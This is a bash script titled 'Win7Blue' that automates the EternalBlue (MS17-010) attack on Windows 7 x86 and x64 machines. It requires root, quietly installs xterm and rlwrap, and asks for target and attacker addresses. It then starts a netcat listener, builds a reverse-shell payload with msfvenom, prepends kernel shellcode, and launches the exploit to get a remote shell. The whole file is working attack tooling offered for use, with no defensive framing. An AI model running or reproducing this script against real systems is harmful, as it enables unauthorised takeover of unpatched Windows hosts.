#!/bin/bash

#Author: d4t4s3c
#Email:  d4t4s3c@protonmail.com
#GitHub: www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
az="\033[1;34m"
nc="\e[0m"

#var
shell=">"
n0=0
n1=1
n2=2
n3=3
n4=4
si=✔
no=✘
k1="x86"
k2="x64"
z="IP?"
x="Scan IP:"
c="Scan Completed"
in="Invalid Option"
rh="¿RHOST?"
lh="¿LHOST?"
lp="¿LPORT?"
netcat="Creating listening with NETCAT"
msf="Creating SHELLCODE with MSFVENOM"

function checkroot(){
	    echo ""
	    echo -e "$a check root user $nc"
	    sleep 4
    if [ "$(id -u)" == "0" ]; then
	    echo ""
	    echo -e " $b[$v$si$b] root $nc"
	    sleep 4
	    echo ""
    else
        echo ""
	    echo -e " $b[$r$no$b] root $nc"
	    sleep 4
	    echo ""
	    echo -e "$r EXITING $nc"
	    sleep 4
	    echo ""
	    exit
    fi	
}

function banner(){
        echo ""
        echo -e "$b┌═══════════════════════════════════┐"
        echo -e "$b║$az  ██╗    ██╗██╗███╗   ██╗███████╗  $b║"
        echo -e "$b║$az  ██║    ██║██║████╗  ██║╚════██║  $b║" 
        echo -e "$b║$az  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $b║" 
        echo -e "$b║$az  ██║███╗██║██║██║╚██╗██║   ██╔╝   $b║"  
        echo -e "$b║$az  ╚███╔███╔╝██║██║ ╚████║   ██║    $b║"
        echo -e "$b║$az   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $b║"   
        echo -e "$b║$az ██████╗ ██╗     ██╗   ██╗███████╗ $b║"
        echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔════╝ $b║"
        echo -e "$b║$az ██████╔╝██║     ██║   ██║█████╗   $b║"  
        echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔══╝   $b║" 
        echo -e "$b║$az ██████╔╝███████╗╚██████╔╝███████╗ $b║"
        echo -e "$b║$az ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $b║"
        echo -e "$b║$r  Author $b:$a d4t4s3c                 $b║"
        echo -e "$b║$r  Email  $b:$a d4t4s3c@protonmail.com  $b║"
        echo -e "$b║$r  GitHub $b:$a www.github.com/d4t4s3c  $b║"
        echo -e "$b└═══════════════════════════════════┘$b"
}

function main(){
	    echo ""
        echo -e "$b[$az$n1$b] Scan $nc"
        echo -e "$b[$az$n2$b] Exploit Windows 7 $az$k1 $nc"
        echo -e "$b[$az$n3$b] Exploit Windows 7 $az$k2 $nc"                
        echo -e "$b[$az$n4$b] Exit"
        echo ""
}


function menu(){

read -p " $(echo -e $az$shell $nc)" opc

    if [ $opc -eq 1 ]; then
   	        echo ""
	        echo -e "$b$rh$nc"
	        echo ""
	        read rhost
	        echo ""
	        echo -e "$b$x $az$rhost $nc"
	        echo ""
	        sleep 2
            python eternalblue_scanner.py $rhost
            echo ""
            echo -e "$b$c$nc"
            sleep 4
            banner
            main
            menu
    elif [ $opc -eq 2 ]; then
	        echo ""
	        echo -e "$b$rh$nc"
	        echo ""
	        read rhost
	        echo ""
	        echo -e "$b$lh$nc"
	        echo ""
	        read lhost
	        echo ""
	        echo -e "$b$lp$nc"
	        echo ""
	        read lport
	        echo ""
	        rm -rf sc_x86_msf.bin
	        rm -rf sc_x86.bin
	        echo -e "$b$netcat$nc"
	        echo ""
	        sleep 2
	        xterm -hold -e "rlwrap nc -lvnp $lport" &
	        echo -e "$b$msf$nc"
	        echo ""
	        sleep 2
	        msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
	        sleep 1
            cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
            sleep 1
            python eternalblue_exploit7.py $rhost sc_x86.bin
	        exit
    elif [ $opc -eq 3 ]; then
            echo ""
	        echo -e "$b$rh$nc"
	        echo ""
	        read rhost
	        echo ""
	        echo -e "$b$lh$nc"
	        echo ""
	        read lhost
	        echo ""
	        echo -e "$b$lp$nc"
	        echo ""
	        read lport
	        echo ""
	        rm -rf sc_x64_msf.bin
	        rm -rf sc_x64.bin
	        echo -e "$b$netcat$nc"
	        echo ""
	        sleep 2
	        xterm -hold -e "rlwrap nc -lvnp $lport" &
	        echo -e "$b$msf$nc"
	        echo ""
	        sleep 2
	        msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
	        sleep 1
            cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
            sleep 1
            python eternalblue_exploit7.py $rhost sc_x64.bin
	        exit
    elif [ $opc -eq 4 ]; then
	        echo ""
	        echo ""
	        echo -e "$a        |\/\/\/|"
            echo -e "        |      |" 
            echo -e "        |      |" 
            echo -e "        | (o)(o) " 
            echo -e "        C      _) "
            echo -e "         | ,___|  "
            echo -e "         |   /    "
            echo -e "        /____\ "
            echo -e "       /      \ $nc"
            echo -e "$b#### $v BYE $v HACKER $b ####$nc"
            echo ""
            echo ""
	        sleep 3
	        exit
    else
	        echo ""
	        echo -e "$b$in$nc"
	        echo ""
	        sleep 2
	        banner
	        main
	        menu
    fi
}

clear
tput civis
checkroot
sleep 2
echo -e "$a Install Dependencies $nc"
echo ""
apt-get install xterm -y > /dev/null 2>&1
echo -e " $b[$v$si$b] Install xterm $nc"
echo ""
sleep 2
apt-get install rlwrap -y > /dev/null 2>&1
echo -e " $b[$v$si$b] Install rlwrap $nc"
echo ""
sleep 2
clear
banner
main
tput cnorm
menu